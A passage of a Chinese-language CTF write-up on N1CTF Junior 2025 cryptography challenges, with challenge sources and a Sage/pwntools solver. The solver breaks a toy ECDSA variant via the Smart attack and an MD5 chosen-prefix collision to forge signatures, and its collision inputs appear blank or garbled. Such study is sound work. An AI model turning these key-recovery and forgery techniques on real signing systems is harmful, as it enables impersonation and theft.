<span class="number">1</span>)</span><br><span class="line">    pub = priv * G</span><br><span class="line">    msg = os.urandom(<span class="number">64</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;=== level <span class="subst">&#123;level&#125;</span> ===&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(catalan_number(level)):</span><br><span class="line">        ctx = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&#x27;context: &#x27;</span>))</span><br><span class="line">        r, s = sign(priv, ctx, msg)</span><br><span class="line">        <span class="keyword">assert</span> verify(pub, ctx, msg, (r, s))</span><br><span class="line">        <span class="keyword">if</span> level &lt;= <span class="number">1</span>: <span class="built_in">print</span>(<span class="string">&#x27;message:&#x27;</span>, msg.<span class="built_in">hex</span>())</span><br><span class="line">        <span class="keyword">if</span> level &lt;= <span class="number">2</span>: <span class="built_in">print</span>(<span class="string">&#x27;sign:&#x27;</span>, r)</span><br><span class="line">        <span class="keyword">if</span> level &lt;= <span class="number">3</span>: <span class="built_in">print</span>(<span class="string">&#x27;ature:&#x27;</span>, s)</span><br><span class="line">    </span><br><span class="line">    r, s = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>(<span class="string">&#x27;signature: &#x27;</span>).split())</span><br><span class="line">    <span class="keyword">assert</span> verify(pub, <span class="string">b&#x27;n1junior_2025&#x27;</span>, <span class="string">f&#x27;cat /flag<span class="subst">&#123;level&#125;</span>&#x27;</span>.encode(), (r, s))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;flag<span class="subst">&#123;level&#125;</span>:&#x27;</span>, flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    chall(<span class="number">0</span>, <span class="string">&quot;💧&quot;</span>)</span><br><span class="line">    chall(<span class="number">1</span>, <span class="string">&quot;🐱&quot;</span>)</span><br><span class="line">    chall(<span class="number">2</span>, FLAG)</span><br></pre></td></tr></table></figure><p>$ECDSA的一个变种$</p><script type="math/tex; mode=display">曲线y^{2}=x^{3}+3</script><p>$pub=priv\cdot G$<br>$z=bytes{_}to{_}long(md5(ctx+msg))$</p><p>$k正常来说，是1到n-1的随机数$<br>$但此处，k=bytes{_}to{_}long(ctx+md5(priv+msg))$</p><p>$ctx是我们可控的，其余与正常的ECDSA一致$</p><p>$r=(k<em>G)_{_x}\pmod n$<br>$s=k^{-1}(z+r</em>priv)\pmod n$</p><p>$sign: (r,s)$</p><p>$verify: r==(s^{-1}(z<em>G+r</em>pub))_{_x}\pmod n$</p><p>$level0和level1都是一次签名验证，得到msg、r、s$<br>$level2是两次签名验证，得到两对(r,s)$</p><p>$同时，还需要对指定消息进行签名伪造，通过验证$<br>$伪造签名，需要使用到私钥priv，而k是未知的$<br>$尝试构造格，但貌似失败了……$</p><p>下面参考<a href="https://zhuanlan.zhihu.com/p/1950219134483796140">大佬的wp</a></p><p>这里我忽视了一个<strong>最重要的点</strong>，<code>n = E.order()</code>，我觉得没什么问题，但实际上，打印出来你会发现，<strong>曲线的阶刚好为模数！！！</strong></p><p>因此，曲线上的所有的点可以构成一个循环群，所有的点都可以表示为某个生成元的倍数</p><p>$r=(k*G)_{_x}\pmod n$</p><p><code>k</code>的求解，正是<code>ECDLP</code>(此处<code>r G n</code>均已知)，正常来说<strong>ECDLP</strong>的求解是很困难的，但因为曲线的<strong>阶等于模数</strong>，导致了可以通过<strong>smart attack</strong>来求解<code>k</code>，具体推导看<a href="https://www.cnblogs.com/futihuanhuan/p/18310044">这个</a>，就不详细阐述，同时<code>k</code>是一个不大于<strong>2^128</strong>的数(在<code>level0 level1</code>中，本地调试好几次都被中断了，因为<code>y</code>有两个，对应<code>k</code>也会有两个)</p><p>在<code>level0 level1</code>中，我们都令<strong>ctx=b’’</strong>，方便我们准确判断<strong>k的上界</strong></p><p>但是到了<code>level2</code>，我们无法获取到<code>msg</code>，只有两对<code>(r,s)</code>，无法像前面一条关系式直接推出私钥<code>priv</code></p><p>$s_{1}<em>k_{1}=(z_{1}+r_{1}</em>priv)\pmod n$<br>$s_{2}<em>k_{2}=(z_{2}+r_{2}</em>priv)\pmod n$</p><p>同时注意题目使用的算法是<code>md5</code>！！！这是破局的关键</p><p>有这样的两个<strong>字节串</strong>S1 S2，满足：</p><ul><li>S1 != S2</li><li>对于任意<strong>字节串</strong> suf（可以为空），<strong>MD5(S1+suf) == MD5(S2+suf)</strong></li></ul><p>详情见<a href="https://marc-stevens.nl/research/hashclash/">密码学家 Marc Stevens的研究</a>，<a href="https://marc-stevens.nl/research/hashclash/ChosenPrefixCollisions/collision1.txt">S1文本</a>，<a href="https://marc-stevens.nl/research/hashclash/ChosenPrefixCollisions/collision2.txt">S2文本</a></p><p>这样得到<code>z1 = z2</code></p><p>$priv=(s_{1}<em>k_{1}-s_{2}</em>k_{2})*(r_{1}-r_{2})^{-1}\pmod n$</p><p>然后，这里<code>k</code>的上下界都不好确定，本来以为$k1\equiv k2\pmod {2^{128}}$，但验证了一番，并不能确定正确的<code>k1 k2</code>，所以我直接不管了，反正<code>25%</code>的概率得到正确的<code>k1 k2</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;sage&#x27;</span>, <span class="string">&#x27;server.sage&#x27;</span>])</span><br><span class="line"></span><br><span class="line">P = <span class="number">0x1337_ca7_eae368ff5d702e6067aaaa77ca_ca7_1337</span></span><br><span class="line">E = EllipticCurve(GF(P), [<span class="number">0</span>, <span class="number">3</span>])</span><br><span class="line">Fp = GF(P)</span><br><span class="line">G = E(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">n = E.order()</span><br><span class="line"></span><br><span class="line">S1 = <span class="string">&#xx27;</span></span><br><span class="line">S2 = <span class="string">&#xx27;</span></span><br><span class="line">S1 = <span class="built_in">bytes</span>.fromhex(S1)</span><br><span class="line">S2 = <span class="built_in">bytes</span>.fromhex(S2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] 模  数 P: <span class="subst">&#123;P&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] 曲线阶 n: <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_k</span>(<span class="params">r, choice</span>):</span><br><span class="line">    r_fp = Fp(r)</span><br><span class="line">    y_fp = (r_fp^<span class="number">3</span> + <span class="number">3</span>).sqrt()</span><br><span class="line">    </span><br><span class="line">    Q1 = E(r_fp, y_fp)</span><br><span class="line">    Q2 = E(r_fp, -y_fp)</span><br><span class="line">    </span><br><span class="line">    k1 = SmartAttack(G, Q1, n)</span><br><span class="line">    k2 = SmartAttack(G, Q2, n)</span><br><span class="line">    <span class="keyword">if</span> choice == <span class="number">0</span>:</span><br><span class="line">        k = k1 <span class="keyword">if</span> k1*G == Q1 <span class="keyword">and</span> k1 &lt; <span class="number">2</span>^<span class="number">128</span> <span class="keyword">else</span> k2</span><br><span class="line">        <span class="keyword">return</span> k</span><br><span class="line">    <span class="keyword">if</span> choice == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> k1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SmartAttack</span>(<span class="params">P, Q, p</span>):</span><br><span class="line">    E = P.curve()</span><br><span class="line">    Eqp = EllipticCurve(</span><br><span class="line">        Qp(p, <span class="number">2</span>), [ZZ(t) + randint(<span class="number">0</span>, p)*p <span class="keyword">for</span> t <span class="keyword">in</span> E.a_invariants()])</span><br><span class="line"></span><br><span class="line">    P_Qps = Eqp.lift_x(ZZ(P.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> P_Qp <span class="keyword">in</span> P_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(P_Qp.xy()[<span class="number">1</span>]) == P.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> Q_Qp <span class="keyword">in</span> Q_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(Q_Qp.xy()[<span class="number">1</span>]) == Q.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    p_times_P = p*P_Qp</span><br><span class="line">    p_times_Q = p*Q_Qp</span><br><span class="line"></span><br><span class="line">    x_P, y_P = p_times_P.xy()</span><br><span class="line">    x_Q, y_Q = p_times_Q.xy()</span><br><span class="line"></span><br><span class="line">    phi_P = -(x_P/y_P)</span><br><span class="line">    phi_Q = -(x_Q/y_Q)</span><br><span class="line">    k = phi_Q/phi_P</span><br><span class="line">    <span class="keyword">return</span> ZZ(k)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">priv, ctx, msg</span>):</span><br><span class="line">    k = bytes_to_long(ctx + md5(<span class="built_in">str</span>(priv).encode() + msg).digest())</span><br><span class="line">    z = bytes_to_long(md5(ctx + msg).digest())</span><br><span class="line">    r = <span class="built_in">int</span>((k * G).x()) % n</span><br><span class="line">    s = (<span class="built_in">pow</span>(k, -<span class="number">1</span>, n) * (z + r * priv)) % n</span><br><span class="line">    <span class="keyword">return</span> r, s</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_level_0_1</span>(<span class="params">level</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] --- 正在解决 Level <span class="subst">&#123;level&#125;</span> ---&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">f&quot;=== level <span class="subst">&#123;level&#125;</span> ===\n&quot;</span>.encode())</span><br><span class="line">    ctx = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;context: &#x27;</span>)</span><br><span class="line">    io.sendline(ctx.<span class="built_in">hex</span>().encode())</span><br><span class="line"></span><br><span class="line">    msg_hex = io.recvline().strip().split(<span class="string">b&#x27;: &#x27;</span>)[<span class="number">1</span>].decode()</span><br><span class="line">    r = <span class="built_in">int</span>(io.recvline().strip().split(<span class="string">b&#x27;: &#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">    s = <span class="built_in">int</span>(io.recvline().strip().split(<span class="string">b&#x27;: &#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">    msg = <span class="built_in">bytes</span>.fromhex(msg_hex)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  [+] 收到 msg: <span class="subst">&#123;msg&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  [+] 收到 r: <span class="subst">&#123;r&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  [+] 收到 s: <span class="subst">&#123;s&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    k = get_k(r, <span class="number">0</span>)</span><br><span class="line">    z = bytes_to_long(md5(ctx + msg).digest())</span><br><span class="line">    priv = ((s * k) - z) * <span class="built_in">pow</span>(r, -<span class="number">1</span>, n) % n</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  [+] 成功恢复私钥: <span class="subst">&#123;priv&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    ctx_final = <span class="string">b&#x27;n1junior_2025&#x27;</span></span><br><span class="line">    msg_final = <span class="string">f&#x27;cat /flag<span class="subst">&#123;level&#125;</span>&#x27;</span>.encode()</span><br><span class="line">    r_final, s_final = sign(priv, ctx_final, msg_final)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  [+] 伪造的签名: r = <span class="subst">&#123;r_final&#125;</span>, s = <span class="subst">&#123;s_final&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;signature: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">f&quot;<span class="subst">&#123;r_final&#125;</span> <span class="subst">&#123;s_final&#125;</span>&quot;</span>.encode())</span><br><span class="line">    flag = io.recvline().decode().strip()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  [SUCCESS] <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_level_2</span>():</span><br><span class="line">    level = <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] --- 正在解决 Level <span class="subst">&#123;level&#125;</span> ---&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">f&quot;=== level <span class="subst">&#123;level&#125;</span> ===\n&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line">    ctx1 = S1</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;context: &#x27;</span>)</span><br><span class="line">    io.sendline(ctx1.<span class="built_in">hex</span>().encode())</span><br><span class="line">    r1 = <span class="built_in">int</span>(io.recvline().strip().split(<span class="string">b&#x27;: &#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">    s1 = <span class="built_in">int</span>(io.recvline().strip().split(<span class="string">b&#x27;: &#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  [+] 收到签名1: r = <span class="subst">&#123;r1&#125;</span>, s = <span class="subst">&#123;s1&#125;</span>&quot;</span>)</span><br><span class="line">    k1 = get_k(r1, <span class="number">2</span>)</span><br><span class="line">    </span><br><span class="line">    ctx2 = S2</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;context: &#x27;</span>)</span><br><span class="line">    io.sendline(ctx2.<span class="built_in">hex</span>().encode())</span><br><span class="line">    r2 = <span class="built_in">int</span>(io.recvline().strip().split(<span class="string">b&#x27;: &#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">    s2 = <span class="built_in">int</span>(io.recvline().strip().split(<span class="string">b&#x27;: &#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  [+] 收到签名2: r = <span class="subst">&#123;r2&#125;</span>, s = <span class="subst">&#123;s2&#125;</span>&quot;</span>)</span><br><span class="line">    k2 = get_k(r2, <span class="number">2</span>)</span><br><span class="line">    </span><br><span class="line">    priv = (s1*k1 - s2*k2) * inverse(r1 - r2, n) % n</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  [+] 恢复的私钥: <span class="subst">&#123;priv&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    ctx_final = <span class="string">b&#x27;n1junior_2025&#x27;</span></span><br><span class="line">    msg_final = <span class="string">f&#x27;cat /flag<span class="subst">&#123;level&#125;</span>&#x27;</span>.encode()</span><br><span class="line">    r_final, s_final = sign(priv, ctx_final, msg_final)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  [+] 伪造的签名: r = <span class="subst">&#123;r_final&#125;</span>, s = <span class="subst">&#123;s_final&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;signature: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">f&quot;<span class="subst">&#123;r_final&#125;</span> <span class="subst">&#123;s_final&#125;</span>&quot;</span>.encode())</span><br><span class="line">    flag = io.recvline().decode().strip()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  [SUCCESS] <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solve_level_0_1(<span class="number">0</span>)</span><br><span class="line">    solve_level_0_1(<span class="number">1</span>)</span><br><span class="line">    solve_level_2()</span><br><span class="line">    io.close()</span><br></pre></td></tr></table></figure><h2 id="sign-the-ca7s"><a href="#sign-the-ca7s" class="headerlink" title="sign the ca7s*"></a>sign the ca7s*</h2><blockquote><p>Sign the cats, so that you can cat the flag! 🐱</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">FLAG = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;flag&#123;**redacted**&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">E = EllipticCurve(GF(<span class="number">0x1337_ca7_eae368ff5d702e6067aaaa77ca_ca7_1337</span>), [<span class="number">0</span>, <span class="number">3</span>])</span><br><span class="line">G, n = E(<span class="number">1</span>, <span class="number">2</span>), E.order()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">priv, ctx, msg</span>):</span><br><span class="line">    k = bytes_to_long(ctx + md5(<span class="built_in">str</span>(priv).encode() + msg).digest())</span><br><span class="line">    z = bytes_to_long(md5(ctx + msg).digest())</span><br><span class="line">    r = <span class="built_in">int</span>((k * G).x()) % n</span><br><span class="line">    s = (<span class="built_in">pow</span>(k, -<span class="number">1</span>, n) * (z + r * priv)) % n</span><br><span class="line">    <span class="keyword">return</span> r, s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">pub, ctx, msg, sig</span>):</span><br><span class="line">    z = bytes_to_long(md5(ctx + msg).digest())</span><br><span class="line">    r, s = sig</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt; r &lt; n <span class="keyword">and</span> <span class="number">0</span> &lt; s &lt; n:</span><br><span class="line">        <span class="keyword">return</span> r == <span class="built_in">int</span>((<span class="built_in">pow</span>(s, -<span class="number">1</span>, n) * (z * G + r * pub)).x()) % n</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chall</span>(<span class="params">level, flag</span>):</span><br><span class="line">    priv = randint(<span class="number">1</span>, n - <span class="number">1</span>)</span><br><span class="line">    pub = priv * G</span><br><span class="line">    msg = os.urandom(<span class="number">64</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;=== level <span class="subst">&#123;level&#125;</span> ===&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(catalan_number(level)):</span><br><span class="line">        ctx = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&#x27;context: &#x27;</span>))</span><br><span class="line">        r, s = sign(priv, ctx, msg)</span><br><span class="line">        <span class="keyword">assert</span> verify(pub, ctx, msg, (r, s))</span><br><span class="line">        <span class="keyword">if</span> level &lt;= <span class="number">1</span>: <span class="built_in">print</span>(<span class="string">&#x27;message:&#x27;</span>, msg.<span class="built_in">hex</span>())</span><br><span class="line">        <span class="keyword">if</span> level &lt;= <span class="number">2</span>: <span class="built_in">print</span>(<span class="string">&#x27;sign:&#x27;</span>, r)</span><br><span class="line">        <span class="keyword">if</span> level &lt;= <span class="number">3</span>: <span class="built_in">print</span>(<span class="string">&#x27;ature:&#x27;</span>, s)</span><br><span class="line">    </span><br><span class="line">    r, s = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>(<span class="string">&#x27;signature: &#x27;</span>).split())</span><br><span class="line">    <span class="keyword">assert</span> verify(pub, <span class="string">b&#x27;n1junior_2025&#x27;</span>, <span class="string">f&#x27;cat /flag<span class="subst">&#123;level&#125;</span>&#x27;</span>.encode(), (r, s))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;flag<span class="subst">&#123;level&#125;</span>:&#x27;</span>, flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    chall(<span class="number">1</span>, <span class="string">&quot;💧&quot;</span>)</span><br><span class="line">    chall(<span class="number">2</span>, <span class="string">&quot;🐱&quot;</span>)</span><br><span class="line">    chall(<span class="number">3</span>, FLAG)</span><br></pre></td></tr></table></figure><p>这题<strong>升级</strong>了，在<code>level3</code>中，我们只能得到五次签名验证的<code>s</code><br>后续也需要使用到<code>hashclash</code>了，抽时间再继续学一波吧……</p><h2 id="sign-one-m0re"><a href="#sign-one-m0re" class="headerlink" title="sign one m0re*"></a>sign one m0re*</h2><blockquote><p>Can you break the one-more unforgeability of this signature scheme? 🖊</p><ol><li>Can you break the one-more <strong>unforgeability</strong> of this <strong>provably secure partially blind signature</strong> scheme?</li><li>eROSion</li></ol></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fastecdsa.curve <span class="keyword">import</span> secp256k1</span><br><span class="line"><span class="keyword">from</span> fastecdsa.point <span class="keyword">import</span> Point</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> randbelow</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">FLAG = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;flag&#123;**redacted**&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">MAX_SESSIONS = <span class="number">192</span></span><br><span class="line"></span><br><span class="line">p, q, G = secp256k1.p, secp256k1.q, secp256k1.G</span><br><span class="line">info = <span class="built_in">int</span>.from_bytes(<span class="string">b&quot;[N1CTF Junior 2025]&quot;</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">z = Point(info, <span class="built_in">pow</span>(info ** <span class="number">3</span> + <span class="number">7</span>, (p + <span class="number">1</span>) // <span class="number">4</span>, p), secp256k1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Signer</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.x = randbelow(q)</span><br><span class="line">        self.y = self.x * G</span><br><span class="line">        self.sessions = &#123;sid: (<span class="number">0</span>, ) <span class="keyword">for</span> sid <span class="keyword">in</span> <span class="built_in">range</span>(MAX_SESSIONS)&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_public_key</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.y</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">commit</span>(<span class="params">self, sid</span>):</span><br><span class="line">        <span class="keyword">assert</span> sid <span class="keyword">in</span> <span class="built_in">range</span>(MAX_SESSIONS), <span class="string">&quot;Invalid session&quot;</span></span><br><span class="line">        <span class="keyword">assert</span> self.sessions[sid][<span class="number">0</span>] == <span class="number">0</span>, <span class="string">&quot;Invalid state&quot;</span></span><br><span class="line">        u, s, d = [randbelow(q) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">        a, b = u * G, s * G + d * z</span><br><span class="line">        self.sessions[sid] = (<span class="number">1</span>, u, s, d)</span><br><span class="line">        <span class="keyword">return</span> a, b</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">self, sid, e</span>):</span><br><span class="line">        <span class="keyword">assert</span> sid <span class="keyword">in</span> <span class="built_in">range</span>(MAX_SESSIONS), <span class="string">&quot;Invalid session&quot;</span></span><br><span class="line">        <span class="keyword">assert</span> self.sessions[sid][<span class="number">0</span>] == <span class="number">1</span>, <span class="string">&quot;Invalid state&quot;</span></span><br><span class="line">        <span class="keyword">assert</span> <span class="number">1</span> &lt; e &lt; q, <span class="string">&quot;Invalid query&quot;</span></span><br><span class="line">        _, u, s, d = self.sessions[sid]</span><br><span class="line">        c = (e - d) % q</span><br><span class="line">        r = (u - c * self.x) % q</span><br><span class="line">        self.sessions[sid] = (<span class="number">2</span>, )</span><br><span class="line">        <span class="keyword">return</span> r, c, s, d</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Verifier</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.messages = <span class="built_in">set</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">self, α, β, z, msg</span>):</span><br><span class="line">        to_hash = <span class="string">&quot;||&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, [α.x, α.y, β.x, β.y, z.x, z.y, msg]))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(sha512(to_hash.encode()).digest(), <span class="string">&quot;big&quot;</span>) % q</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, pub, sig, msg</span>):</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">all</span>(<span class="number">1</span> &lt; x &lt; q <span class="keyword">for</span> x <span class="keyword">in</span> sig), <span class="string">&quot;Invalid signature&quot;</span></span><br><span class="line">        ρ, ω, σ, δ = sig</span><br><span class="line">        <span class="keyword">if</span> (ω + δ) % q == self.oracle(ρ * G + ω * pub, σ * G + δ * z, z, msg):</span><br><span class="line">            self.messages.add(msg)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(self.messages) == MAX_SESSIONS + <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> FLAG</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Good signature&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bad signature&quot;</span></span><br><span class="line"></span><br><span class="line">signal.alarm(<span class="number">300</span>)</span><br><span class="line">signer = Signer()</span><br><span class="line">verifier = Verifier()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    cmd, *args = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>).split()</span><br><span class="line">    <span class="keyword">if</span> cmd == <span class="string">&quot;get_key&quot;</span>:</span><br><span class="line">        y = signer.get_public_key()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;y = (<span class="subst">&#123;y.x&#125;</span>, <span class="subst">&#123;y.y&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd == <span class="string">&quot;commit&quot;</span>:</span><br><span class="line">        sid = <span class="built_in">int</span>(args[<span class="number">0</span>])</span><br><span class="line">        a, b = signer.commit(sid)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;a = (<span class="subst">&#123;a.x&#125;</span>, <span class="subst">&#123;a.y&#125;</span>)&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;b = (<span class="subst">&#123;b.x&#125;</span>, <span class="subst">&#123;b.y&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd == <span class="string">&quot;sign&quot;</span>:</span><br><span class="line">        sid, e = <span class="built_in">int</span>(args[<span class="number">0</span>]), <span class="built_in">int</span>(args[<span class="number">1</span>])</span><br><span class="line">        r, c, s, d = signer.sign(sid, e)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;r = &#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;s = &#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;d = &#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd == <span class="string">&quot;verify&quot;</span>:</span><br><span class="line">        sig, msg = <span class="built_in">tuple</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, args[:<span class="number">4</span>])), args[<span class="number">4</span>]</span><br><span class="line">        <span class="built_in">print</span>(verifier.verify(signer.get_public_key(), sig, msg))</span><br></pre></td></tr></table></figure><h2 id="SM1¼"><a href="#SM1¼" class="headerlink" title="SM1¼*"></a>SM1¼*</h2><blockquote><p>SM4 is a secure block cipher. So is SM1¼. 🔒</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">FLAG = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;flag&#123;**redacted**&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">S = (</span><br><span class="line">    <span class="number">0xD6</span>, <span class="number">0x90</span>, <span class="number">0xE9</span>, <span class="number">0xFE</span>, <span class="number">0xCC</span>, <span 